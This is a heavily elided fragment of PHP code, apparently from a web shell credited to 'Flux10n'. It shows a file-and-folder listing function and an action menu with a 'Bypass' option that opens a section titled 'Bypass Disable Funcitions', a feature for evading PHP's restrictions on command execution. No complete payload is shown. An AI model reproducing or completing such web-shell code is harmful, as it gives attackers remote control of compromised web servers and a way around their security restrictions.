...
function files_and_folder() {
	...
	print "</table>";
	print "<br><center><div class='footer'>Copyright &copy; ".date("Y")." - <a href='https://github.com/flux10n' target='_blank'>".color(1, 2, "Flux10n")."</a></div></center>";
}
...
function action() {
	...
	print "<li>[ <a href='?dir=".path()."&do=bypass'>Bypass</a> ]</li>";
	...
	if(isset($_GET['do'])) {
		...
		echo "<center>";
		echo "<h1>Bypass Disable Funcitions</h1>";
